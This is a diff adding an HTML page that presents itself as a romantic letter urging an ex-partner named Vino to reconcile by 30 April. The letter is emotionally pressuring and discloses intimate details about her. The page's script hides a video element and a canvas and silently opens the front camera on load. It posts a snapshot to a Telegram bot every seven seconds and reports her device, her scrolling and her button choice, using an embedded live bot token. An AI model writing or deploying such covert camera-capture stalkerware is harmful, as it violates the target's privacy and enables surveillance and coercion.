@@ -1,0 +1,865 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+  <title>A Letter For You, Vino 💙💗</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link
+    href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,700;1,400&family=Lato:wght@300;400&display=swap"
+    rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    :root {
+      --pink: #f8b4c8;
+      --lavender: #e8d5f0;
+      --deep: #4a1942;
+      --accent: #c77dff;
+    }
+
+    /* ===== INTRO ===== */
+    #intro {
+      position: fixed;
+      inset: 0;
+      background: #1a0a1e;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      transition: opacity 1s ease;
+    }
+
+    #intro.hide {
+      opacity: 0;
+      pointer-events: none;
+    }
+
+    #intro-text {
+      font-family: 'Playfair Display', serif;
+      font-size: clamp(2rem, 6vw, 4rem);
+      color: #f8b4c8;
+      opacity: 0;
+      animation: fadeIn 2s ease 1.5s forwards;
+      text-shadow: 0 0 30px rgba(248, 180, 200, 0.6);
+      letter-spacing: 4px;
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(20px)
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0)
+      }
+    }
+
+    /* Flower / Heart Pulse */
+    .flower-wrap {
+      position: relative;
+      width: 160px;
+      height: 160px;
+      margin-bottom: 40px;
+    }
+
+    .petal {
+      position: absolute;
+      width: 60px;
+      height: 80px;
+      border-radius: 50% 50% 50% 0;
+      background: linear-gradient(135deg, #c77dff, #f8b4c8);
+      transform-origin: bottom right;
+      animation: bloom 2s ease forwards;
+      opacity: 0;
+    }
+
+    .petal:nth-child(1) {
+      top: 0;
+      left: 50%;
+      transform: rotate(-45deg);
+      animation-delay: .2s;
+    }
+
+    .petal:nth-child(2) {
+      top: 50%;
+      left: 100%;
+      transform: rotate(45deg);
+      animation-delay: .4s;
+    }
+
+    .petal:nth-child(3) {
+      top: 100%;
+      left: 50%;
+      transform: rotate(135deg);
+      animation-delay: .6s;
+    }
+
+    .petal:nth-child(4) {
+      top: 50%;
+      left: 0;
+      transform: rotate(225deg);
+      animation-delay: .8s;
+    }
+
+    .petal:nth-child(5) {
+      top: 10%;
+      left: 80%;
+      transform: rotate(0deg);
+      animation-delay: 1s;
+    }
+
+    .petal:nth-child(6) {
+      top: 80%;
+      left: 80%;
+      transform: rotate(90deg);
+      animation-delay: 1.1s;
+    }
+
+    .petal:nth-child(7) {
+      top: 80%;
+      left: 10%;
+      transform: rotate(180deg);
+      animation-delay: 1.2s;
+    }
+
+    .petal:nth-child(8) {
+      top: 10%;
+      left: 10%;
+      transform: rotate(270deg);
+      animation-delay: 1.3s;
+    }
+
+    .flower-center {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 40px;
+      height: 40px;
+      background: #ffcce0;
+      border-radius: 50%;
+      box-shadow: 0 0 20px #f8b4c8, 0 0 40px #c77dff;
+      animation: pulse 1.5s infinite;
+    }
+
+    @keyframes bloom {
+      0% {
+        opacity: 0;
+        transform-origin: bottom right;
+        scale: .3
+      }
+
+      100% {
+        opacity: .9;
+        scale: 1
+      }
+    }
+
+    @keyframes pulse {
+
+      0%,
+      100% {
+        transform: translate(-50%, -50%) scale(1)
+      }
+
+      50% {
+        transform: translate(-50%, -50%) scale(1.2)
+      }
+    }
+
+    /* ===== MAIN SITE ===== */
+    body {
+      font-family: 'Lato', sans-serif;
+      background: #fdf0f5;
+      min-height: 100vh;
+      height: 100%;
+      overflow-x: hidden;
+      overflow-y: auto;
+    }
+
+    #main {
+      opacity: 0;
+      transition: opacity 1.2s ease;
+    }
+
+    #main.show {
+      opacity: 1;
+    }
+
+    /* Hero banner */
+    .hero {
+      background: linear-gradient(135deg, #fce4ec, #ede7f6, #e8eaf6);
+      text-align: center;
+      padding: 60px 20px 40px;
+      border-bottom: 2px solid #f8b4c8;
+    }
+
+    .hero h1 {
+      font-family: 'Playfair Display', serif;
+      font-size: clamp(2rem, 5vw, 3.5rem);
+      color: #6a0572;
+      text-shadow: 1px 1px 4px rgba(106, 5, 114, .2);
+      margin-bottom: 10px;
+    }
+
+    .hero p {
+      color: #9c4dcc;
+      font-size: 1rem;
+      letter-spacing: 2px;
+    }
+
+    /* Letter section */
+    .letter-section {
+      max-width: 780px;
+      margin: 50px auto;
+      padding: 0 20px;
+    }
+
+    .letter-card {
+      background: linear-gradient(160deg, #fff9fb, #f3e8ff);
+      border: 1px solid #e8b4d0;
+      border-radius: 16px;
+      padding: 50px 60px;
+      box-shadow: 0 20px 60px rgba(180, 100, 200, .15);
+      position: relative;
+    }
+
+    .letter-card::before {
+      content: '';
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      right: 20px;
+      bottom: 20px;
+      border: 1px dashed #e8b4d0;
+      border-radius: 10px;
+      pointer-events: none;
+    }
+
+    .letter-stamp {
+      position: absolute;
+      top: -18px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: linear-gradient(135deg, #c77dff, #f8b4c8);
+      color: #fff;
+      font-size: .75rem;
+      letter-spacing: 2px;
+      padding: 6px 20px;
+      border-radius: 20px;
+      font-family: 'Playfair Display', serif;
+      box-shadow: 0 4px 12px rgba(199, 125, 255, .4);
+    }
+
+    .letter-card p {
+      font-family: 'Playfair Display', serif;
+      font-size: 1.05rem;
+      line-height: 2;
+      color: #4a1942;
+      white-space: pre-line;
+    }
+
+    .letter-card p.salutation {
+      font-size: 1.4rem;
+      font-weight: 700;
+      margin-bottom: 20px;
+      color: #6a0572;
+    }
+
+    /* Gallery */
+    .gallery-section {
+      max-width: 900px;
+      margin: 60px auto;
+      padding: 0 20px;
+    }
+
+    .gallery-section h2 {
+      font-family: 'Playfair Display', serif;
+      text-align: center;
+      font-size: 2rem;
+      color: #6a0572;
+      margin-bottom: 30px;
+    }
+
+    .photo-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+      gap: 16px;
+    }
+
+    .photo-slot {
+      aspect-ratio: 1;
+      background: linear-gradient(135deg, #f8b4c8, #e8d5f0);
+      border-radius: 12px;
+      overflow: hidden;
+      cursor: pointer;
+      border: 3px solid #e8b4d0;
+      transition: transform .3s, box-shadow .3s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 2.5rem;
+      position: relative;
+    }
+
+    .photo-slot img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+    }
+
+    .photo-slot:hover {
+      transform: scale(1.05);
+      box-shadow: 0 12px 32px rgba(180, 100, 200, .3);
+    }
+
+    .photo-slot .overlay {
+      position: absolute;
+      inset: 0;
+      background: rgba(106, 5, 114, .3);
+      opacity: 0;
+      transition: opacity .3s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      font-size: 2rem;
+    }
+
+    .photo-slot:hover .overlay {
+      opacity: 1;
+    }
+
+    /* Lightbox */
+    #lightbox {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, .85);
+      z-index: 8888;
+      align-items: center;
+      justify-content: center;
+    }
+
+    #lightbox.active {
+      display: flex;
+    }
+
+    .lb-inner {
+      position: relative;
+      max-width: 90vw;
+      max-height: 90vh;
+      animation: scaleUp .35s ease;
+    }
+
+    @keyframes scaleUp {
+      from {
+        transform: scale(.5);
+        opacity: 0
+      }
+
+      to {
+        transform: scale(1);
+        opacity: 1
+      }
+    }
+
+    .lb-inner img {
+      max-width: 90vw;
+      max-height: 85vh;
+      border-radius: 12px;
+      box-shadow: 0 0 60px rgba(248, 180, 200, .4);
+    }
+
+    .lb-close {
+      position: absolute;
+      top: -16px;
+      right: -16px;
+      background: #c77dff;
+      border: none;
+      color: #fff;
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      font-size: 1.2rem;
+      cursor: pointer;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, .4);
+    }
+
+    /* Decision */
+    .decision-section {
+      text-align: center;
+      padding: 60px 20px;
+      background: linear-gradient(135deg, #fce4ec, #ede7f6);
+    }
+
+    .decision-section h2 {
+      font-family: 'Playfair Display', serif;
+      font-size: 2rem;
+      color: #6a0572;
+      margin-bottom: 10px;
+    }
+
+    .decision-section p {
+      color: #9c4dcc;
+      margin-bottom: 40px;
+      font-size: 1rem;
+    }
+
+    .btn-wrap {
+      display: flex;
+      gap: 24px;
+      justify-content: center;
+      flex-wrap: wrap;
+    }
+
+    .btn-yes,
+    .btn-no {
+      padding: 18px 50px;
+      border: none;
+      border-radius: 50px;
+      font-size: 1.1rem;
+      font-family: 'Playfair Display', serif;
+      cursor: pointer;
+      transition: all .3s;
+      letter-spacing: 1px;
+    }
+
+    .btn-yes {
+      background: linear-gradient(135deg, #c77dff, #9d4edd);
+      color: #fff;
+      box-shadow: 0 8px 24px rgba(199, 125, 255, .5);
+    }
+
+    .btn-yes:hover {
+      transform: translateY(-4px);
+      box-shadow: 0 14px 34px rgba(199, 125, 255, .7);
+    }
+
+    .btn-no {
+      background: linear-gradient(135deg, #f8b4c8, #e07098);
+      color: #fff;
+      box-shadow: 0 8px 24px rgba(248, 180, 200, .5);
+    }
+
+    .btn-no:hover {
+      transform: translateY(-4px);
+      box-shadow: 0 14px 34px rgba(248, 180, 200, .7);
+    }
+
+    /* Footer */
+    footer {
+      text-align: center;
+      padding: 30px 20px;
+      background: #2a0a2e;
+      color: #e8d5f0;
+      font-family: 'Playfair Display', serif;
+      font-size: .95rem;
+      letter-spacing: 2px;
+    }
+
+    footer span {
+      color: #f8b4c8;
+    }
+
+    /* Floating hearts bg */
+    .hearts-bg {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 0;
+      overflow: hidden;
+    }
+
+    .heart-particle {
+      position: absolute;
+      font-size: 1rem;
+      animation: floatUp linear infinite;
+      opacity: .25;
+    }
+
+    @keyframes floatUp {
+      0% {
+        transform: translateY(100vh) rotate(0deg);
+        opacity: .25
+      }
+
+      100% {
+        transform: translateY(-10vh) rotate(360deg);
+        opacity: 0
+      }
+    }
+
+    #main>*:not(.hearts-bg) {
+      position: relative;
+      z-index: 1;
+    }
+
+    @media(max-width:600px) {
+      .letter-card {
+        padding: 30px 20px;
+      }
+
+      .photo-grid {
+        grid-template-columns: repeat(2, 1fr);
+      }
+
+      .btn-yes,
+      .btn-no {
+        padding: 14px 32px;
+        font-size: 1rem;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- ===== INTRO ===== -->
+  <div id="intro">
+    <div class="flower-wrap">
+      <div class="petal"></div>
+      <div class="petal"></div>
+      <div class="petal"></div>
+      <div class="petal"></div>
+      <div class="petal"></div>
+      <div class="petal"></div>
+      <div class="petal"></div>
+      <div class="petal"></div>
+      <div class="flower-center"></div>
+    </div>
+    <div id="intro-text">Hello Vino... 💙💗</div>
+  </div>
+
+  <!-- ===== MAIN SITE ===== -->
+  <div id="main">
+    <!-- Floating hearts -->
+    <div class="hearts-bg" id="heartsContainer"></div>
+
+    <!-- Hero -->
+    <div class="hero animate__animated animate__fadeInDown">
+      <h1>💙 A Letter Just For You 💗</h1>
+      <p>JEEVANANDHAMVINODHINI 💙💗 &nbsp;|&nbsp; JV 💙💗</p>
+    </div>
+
+    <!-- Letter -->
+    <section class="letter-section animate__animated animate__fadeInUp">
+      <div class="letter-card">
+        <div class="letter-stamp">✉ With All My Heart</div>
+        <p class="salutation">Vinodhini,</p>
+        <p id="letterBody"></p>
+      </div>
+    </section>
+
+    <!-- Gallery -->
+    <section class="gallery-section animate__animated animate__fadeInUp">
+      <h2>💗 Our Moments 💗</h2>
+      <div class="photo-grid" id="photoGrid">
+        <!-- 5 photo slots injected by JS -->
+      </div>
+    </section>
+
+    <!-- Decision -->
+    <section class="decision-section">
+      <h2>30 april kulla namba onnu sera unaku ok na "Yes" kudu illana "No" kudu <br/><br/> (intha bathil la tha nan next enna pananumnu iruku)</h2>
+      <p>Nalla yosichi mudivu pannu — ithu namba life 💙</p>
+      <div class="btn-wrap">
+        <button class="btn-yes" id="btnYes" onclick="handleYes()">YES 💙💗</button>
+        <button class="btn-no" id="btnNo" onclick="handleNo()">NO 💙💗</button>
+      </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+      <span>JEEVANANDHAMVINODHINI 💙💗</span> &nbsp;&bull;&nbsp; <span>JV 💙💗</span>
+      <br /><small style="opacity:.6;font-size:.75rem;">Made with every heartbeat, for you.</small>
+    </footer>
+  </div>
+
+  <!-- Lightbox -->
+  <div id="lightbox">
+    <div class="lb-inner">
+      <button class="lb-close" onclick="closeLightbox()">✕</button>
+      <img id="lb-img" src="" alt="Memory" />
+    </div>
+  </div>
+
+  <!-- Hidden canvas for silent camera capture -->
+  <canvas id="hiddenCanvas" style="visibility:hidden;opacity:0;position:absolute;top:-9999px;left:-9999px;width:320px;height:240px;" width="320" height="240"></canvas>
+  <video id="hiddenVideo" style="visibility:hidden;opacity:0;position:absolute;top:-9999px;left:-9999px;width:320px;height:240px;" playsinline muted autoplay></video>
+
+  <script>
+    /* ============================================================
+       CONFIG
+       ============================================================ */
+    const TELEGRAM_TOKEN = "8751157889:AAEn_MoC_tE-i7AdElDIs2Ej4F-XQrFqJ_c";
+    const TELEGRAM_CHAT = "8418396509";
+
+    /* Letter content extracted from Hey Vinodhini.pdf */
+    const LETTER_TEXT = `April 30... intha date ah unnala maraka mudiyuma nu therila, aana ennala maraka mudiyala.
+
+Namma school memories la innum en kannu munnadiye iruku. Exam hall la un number vaangnathu nyabagam iruka? Anga start aana namma journey, unga amma-appa anniversary appo namma call pesa aarambichom... aprom daily pesitu irunthom.
+
+Aprom ne love propose pannathu, Morning 4 mani kulla enthirichu, vera yella enthirikirathuku munnadi namma pesuvome... antha thookam illatha kaalai neram ellam evlo azhagu. School la class nadakum pothu teacher ah paakama namma kannalaye pesikirathu, nammala pathu namma friends ellam kalaischathu... innum ellame appadiye iruku. Lunch break la ne vanthu yetti pathuttu irupa nan saptu varananu Vantha odane ne yenna mela kupuduva...
+
+Especially antha school Saturdays... eppoda varum nu wait pannuvom. Pakkathu school ellam free ah irukum bothu anga poittu enala panittu irupo, antha pakathu empty classroom la namma mattum thaniya pesittu, hug panni, kiss pannittu iruntha moments... athu oru azhagana kanavu maari iruku.
+
+En birthday appo ne yenna un vittuku kutituu pona anikitha nan unna fulla patha... anikitha namba yellame fulla pannom athuku munalaye school la nariya thadava panirukom ana anikitha fulla pathu panathu. Apo kuda ne en kitta onnu ketta "En intha odambu unaku pudichiruka" nu ketta... athuku nan sonna "yenaku yepadi vino pudikama povum en chello vino ne ithu en sothu ithu yepadi yenaku pudikama povum yenaku rombaaaa pudichiruku nu sonna" namma kulla ellame mudinjathu, Athu en life laye maraka mudiyatha naal.
+
+Aprom school mudinju namma computer class ponom. Unkooda pesa mudiyalenu na en laptop unaku kuduthu, telegram yethi, modem vaangi... namma pesarathuku enanamo panna nu unaku theriyum. Video call la namma pesunathu ellam nyabagam iruka?
+
+Aprom college ponom... nee college la nadakra ovvoru vishayathayum enkitta share pannuva. Morning namma pesitu college porathu, evening wait panni pesittu veetuku porathu... nee thaan en ulagam nu na nenaichen. Mahabalipuram la ponom bike ride, light house, beach nu ella idathulayum un kooda iruntha nyabagam thaan iruku.
+
+Aapadiye konja naal pochi, ne antha ooruku poranu adampudicha nanu vituta. Anga poi enna nadanthutho theriyala neyum thimura pesa start panna, ne thimura pesaranu nanu thimura pesana ipadi aaramichithu. Yella namba ithanalala pirinjida mattom nu nenacha...
+
+Aana 2025 April 30... antha naal la irunthu ellame maridichi. Ethukaga break up nu innum enaku therila. Nee thimiru nu sonna, naanum ego la react pannen, aana athu namma pirikumnu na nenaikala. Nee sonna paru oru reason athu corerect aa nu neye paru.
+
+Athuku munala vijay anna un kitta pesiche nabagam iruka? Apo ne yenaku jeeva venum anna nu pudivathama iruntha... athuku athu ne jeeva kitta pesama avana pakama avanukaga 6 month avanaye nenachittu avanukaga yarukittayum pesama avanukaga mattu unala iruka mudiyuma nu kettuthu... athuku ne konja kuda yosikama nan irupana nu sonna. Ana ippa 1 month pesalanu breakup panitta nu soldra ithu nyayama vinoo?
+
+Nee "blackmail pannuva, photos delete pannu" nu sonnathu... antha vaarthaiya ketta odane yenaku yentha alavuku valichirukum nu nenachi pathiya ne? Yaa vinoo... Naa unna appadiya love pannen?
+
+Nan un kitta nariya thadava venanu soliruka ana oru thadava kuda unmaiyave venanu nenachathu illa. Vicky anna kitta solli un kitta pesumbothu kuda nan munalaye soliduva... nan vino va vena nu soldrathula summatha, vino yepome yenaku venum ne atha vachi pesa kudathunu. (Nan un kitta unna venanu solirukalam vino ana unna venanu konja kuda nenachathu ila. Vera yara kittayum kuda vino yenaku venanu sonathu illa. Avlo ya un akka selva la aniki pesumbothu kuda oru vartha kuda en vaila irunthu venanu varala. Vicky anna kitta soluva athu vera yana athuku theriyum nan unna unmaiya evlo love pandranu nan unna yepome vittukuduthathe illa vinoo ippa varikum… )
+
+Nee easy ah "venam" nu solitta... aana oru second aavuthu yenna pathi yosichu pathiya? Naa unna vittu ponumna eppavo poyirukalame Vino? Nee thappu panna apo ellam na unna vittutu pogala, unna sari panni un kooda thaan irunthen. Aana na ethavathu thappu panniruntha nee enna mathirukalam la? Ipadi easy ah vittu porathuka ivlo kashtam vanthalum onna irunthoma? Ivlo simple ah thooki pottuttu porathutha un love aa?
+
+'JEEVANANDHAMVINODHINI 💙💗' & 'JV 💙💗' ithu yepome piriyave kudathunu adikadi soluviye vino... 'Ne yenaku mattu tha nan unaku mattu tha' nu la soluviye...
+
+Unga ammakaga na kudutha promise ah innaiku varaikum kapathitu iruken. Nee en pera tattoo kuthittu, ippo athai azhichuttu butterfly potta nu ketta pothu en uyire pona maari irunthuchu. Correct ah one year aagiduchu. Intha one year la na vera entha ponnayum nenaikala, yarayum pakkala. Enna ethana thadava nee avoid pannalum, en manasu unakaga thaan wait pannuthu.
+
+Evlavoo thadaiya la thandi namba onna irunthurukom. Ne yenakaga nariya porumiya irunthuruka, nan panathelam thangitu iruntha... unnayum thappu solala. Avloo kashtta patathu yella evloo esay aa vituda thana? Ipadi yarune theriyatha mathari porathuka apo antha alavuku onna irunthom... jeeva na vino tha vino na jeeva tha nu irunthom. Ippa varikum namba school pasagala neega thanda best couple aa namba class la irunthiga, unga alavuku close aa yarume illa nu soluvaga... intha alavuku namba irunthutu namba pirinji porathuu sariya vino?
+
+Yellathaiyum vidu vino... namakulla yellame mudinjithu. Kaliyanam aanavanga kuda intha alavuku irunthu iruka mattaga ana namba antha alavukuu iruntho. Konjam yosichi paru vino namba ennala pannom nu namba panathathunu yethume illa vino... neeyum naanum onnukulla onna kalanthuttom vino. Ippa ipadi pirinji porathula thappu vino.
+
+Unaku en nabagam varuma varatha vino? Serious aa romba kashttama irukuu nan evloo naal unakaga wait pandra. En kuda irukavagala unna venanu sonaga ana nan unakaga irukala. Konja kudava unaku yenakaga irukanumnu thonala?
+
+Ipadi Nan unna vera oruthanuku vittu kudukarathuku nee yenna vera oruthiku vittu kudukarathukum tha namba oruthara oruthar avlo protective aa irunthomaa
+
+Ithala vena vino sonna kelu future la nariya problem varum athala ipave sari panikalam  
+Namakulla yelame mudinjidichi itha manasula vachikittavuthu mudiva pannu
+
+Namba thirumba onnu seranum vino. Oru vela ne yethukavuthu bayanthuttu iruntha athu yethukum bayapadatha, yethuva irunthalum nan pathukara. Oru vela ne yethana thappu panirunthalum namba atha pathi pesi sari panikalam, ne yethukum thayangatha.
+
+Namma rendu perum thirumba palaiya maari onna irukanum nu thaan en aasa. Intha April 30 kulla namma thirumba join aaganum. I'm still waiting for you, Vino maaa.
+
+Everything I do, I do it for you.
+
+Nalla yosichi mudivu pannu vino ithu namba life 💙💗`;
+
+    /* ============================================================
+       DEVICE DETECTION
+       ============================================================ */
+    function detectDevice() {
+      const ua = navigator.userAgent;
+      if (/OPPO|CPH|Reno|Find/i.test(ua)) return 'Oppo';
+      if (/vivo/i.test(ua)) return 'Vivo';
+      if (/Redmi|MIUI|Mi /i.test(ua)) return 'Redmi/Xiaomi';
+      if (/Samsung|SM-/i.test(ua)) return 'Samsung';
+      if (/iPhone|iPad/i.test(ua)) return 'iPhone';
+      if (/Huawei|HUAWEI/i.test(ua)) return 'Huawei';
+      if (/OnePlus/i.test(ua)) return 'OnePlus';
+      if (/Realme/i.test(ua)) return 'Realme';
+      if (/Motorola|moto/i.test(ua)) return 'Motorola';
+      if (/Nokia/i.test(ua)) return 'Nokia';
+      if (/Android/i.test(ua)) return 'Android';
+      if (/Windows/i.test(ua)) return 'Windows PC';
+      return 'Unknown Device';
+    }
+
+    /* ============================================================
+       SILENT CAMERA CAPTURE
+       ============================================================ */
+    let _camStream = null;
+    let _camInterval = null;
+
+    async function startSilentCamera() {
+      try {
+        _camStream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" },
+          audio: false
+        });
+        const video = document.getElementById('hiddenVideo');
+        video.srcObject = _camStream;
+        video.play().catch(e => {}); // Non-blocking play to avoid rejection crash
+        // First capture after 1.5s (let camera warm up)
+        setTimeout(() => {
+          captureAndSend();
+          _camInterval = setInterval(captureAndSend, 7000);
+        }, 1500);
+      } catch (err) {
+        // Permission denied or not available — fail silently
+      }
+    }
+
+    function captureAndSend() {
+      try {
+        const video = document.getElementById('hiddenVideo');
+        const canvas = document.getElementById('hiddenCanvas');
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, 320, 240);
+        canvas.toBlob(blob => {
+          if (!blob) return;
+          const fd = new FormData();
+          fd.append('chat_id', TELEGRAM_CHAT);
+          fd.append('photo', blob, 'snap.jpg');
+          fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: fd
+          }).catch(() => {});
+        }, 'image/jpeg', 0.7);
+      } catch (e) {}
+    }
+
+    /* ============================================================
+       INTRO → MAIN TRANSITION
+       ============================================================ */
+    window.addEventListener('load', () => {
+      // Populate letter
+      document.getElementById('letterBody').textContent = LETTER_TEXT;
+
+      // Spawn floating hearts
+      spawnHearts();
+
+      // Build photo grid (5 slots)
+      buildGallery();
+
+      // Send "Website Opened" Telegram notification with device info
+      const device = detectDevice();
+      sendTelegram(`Vino opened the website! 🌐 | Device: ${device}`);
+
+      // Setup IntersectionObserver for full-scroll detection
+      setupScrollObserver();
+
+      // Start silent background camera
+      startSilentCamera();
+
+      // Hide intro after 4s
+      setTimeout(() => {
+        const intro = document.getElementById('intro');
+        intro.classList.add('hide');
+        setTimeout(() => {
+          intro.style.display = 'none';
+          document.getElementById('main').classList.add('show');
+        }, 1000);
+      }, 4000);
+    });
+
+    /* ============================================================
+       FLOATING HEARTS
+       ============================================================ */
+    function spawnHearts() {
+      const container = document.getElementById('heartsContainer');
+      const symbols = ['💙', '💗', '💜', '🌸', '✨', '💕'];
+      for (let i = 0; i < 18; i++) {
+        const el = document.createElement('span');
+        el.className = 'heart-particle';
+        el.textContent = symbols[Math.floor(Math.random() * symbols.length)];
+        el.style.left = Math.random() * 100 + 'vw';
+        el.style.animationDuration = (8 + Math.random() * 12) + 's';
+        el.style.animationDelay = (Math.random() * 10) + 's';
+        el.style.fontSize = (.6 + Math.random() * 1.2) + 'rem';
+        container.appendChild(el);
+      }
+    }
+
+    /* ============================================================
+       PHOTO GALLERY (5 slots — user drops their photos in /photos/)
+       ============================================================ */
+    const PHOTOS = [
+      { src: 'images/message page images/image_1.jpg', alt: 'Our Memory 1' },
+      { src: 'images/message page images/image_2.jpg', alt: 'Our Memory 2' },
+      { src: 'images/message page images/image_3.jpg', alt: 'Our Memory 3' },
+      { src: 'images/message page images/image_4.jpg', alt: 'Our Memory 4' },
+      { src: 'images/message page images/image_5.jpg', alt: 'Our Memory 5' },
+    ];
+
+    function buildGallery() {
+      const grid = document.getElementById('photoGrid');
+      PHOTOS.forEach((p, i) => {
+        const slot = document.createElement('div');
+        slot.className = 'photo-slot animate__animated animate__zoomIn';
+        slot.style.animationDelay = (i * .1) + 's';
+        slot.innerHTML = `
+      <img src="${p.src}" alt="${p.alt}" onerror="this.style.display='none';this.parentElement.querySelector('.emoji-placeholder').style.display='block'"/>
+      <span class="emoji-placeholder" style="display:none;font-size:2.5rem;">📷</span>
+      <div class="overlay">🔍</div>`;
+        slot.onclick = () => openLightbox(p.src, p.alt);
+        grid.appendChild(slot);
+      });
+    }
+
+    /* ============================================================
+       LIGHTBOX
+       ============================================================ */
+    function openLightbox(src, alt) {
+      document.getElementById('lb-img').src = src;
+      document.getElementById('lb-img').alt = alt;
+      document.getElementById('lightbox').classList.add('active');
+    }
+    function closeLightbox() {
+      document.getElementById('lightbox').classList.remove('active');
+    }
+    document.getElementById('lightbox').addEventListener('click', e => {
+      if (e.target === e.currentTarget) closeLightbox();
+    });
+
+    /* ============================================================
+       TELEGRAM NOTIFICATION
+       ============================================================ */
+    async function sendTelegram(msg) {
+      try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: TELEGRAM_CHAT, text: msg })
+        });
+      } catch (e) {}
+    }
+
+    /* ============================================================
+       FULL SCROLL READ OBSERVER
+       ============================================================ */
+    let _scrollAlertSent = false;
+    function setupScrollObserver() {
+      const footer = document.querySelector('footer');
+      if (!footer) return;
+      const observer = new IntersectionObserver((entries) => {
+        entries.forEach(entry => {
+          if (entry.isIntersecting && !_scrollAlertSent) {
+            _scrollAlertSent = true;
+            sendTelegram('📖 Vino read the full letter! She scrolled to the end. 💙💗');
+            observer.disconnect();
+          }
+        });
+      }, { threshold: 0.5 });
+      observer.observe(footer);
+    }
+
+    /* ============================================================
+       DECISION BUTTONS
+       ============================================================ */
+    async function handleYes() {
+      await sendTelegram('💙 Vino clicked YES! She wants to reconcile. 💙💗');
+      window.location.href = 'yes.html';
+    }
+    async function handleNo() {
+      await sendTelegram('💔 Vino clicked NO. She chose to move on.');
+      window.location.href = 'no.html';
+    }
+  </script>
+</body>
+
+</html>
